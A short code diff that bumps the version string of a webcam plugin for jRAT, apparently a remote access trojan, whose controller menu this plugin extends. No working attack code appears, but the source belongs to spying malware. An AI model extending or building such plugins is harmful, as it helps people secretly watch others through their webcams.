@@ -31,7 +31,7 @@ public class WebcamPlugin extends Plugin {
 	public static Map<Client, List<String>> map = new HashMap<Client, List<String>>();
 
 	public WebcamPlugin() {
-		super("Webcam", "1.1.1", "Webcam Plugin", "jRAT", IconUtils.getIcon("icon", WebcamPlugin.class));
+		super("Webcam", "1.2", "Webcam Plugin", "jRAT", IconUtils.getIcon("icon", WebcamPlugin.class));
 		
 		entry = new RATControlMenuEntry("Webcam", IconUtils.getIcon("icon", WebcamPlugin.class), PanelWebcam.class);
 		RATControlMenuEntry.addEntry(entry);
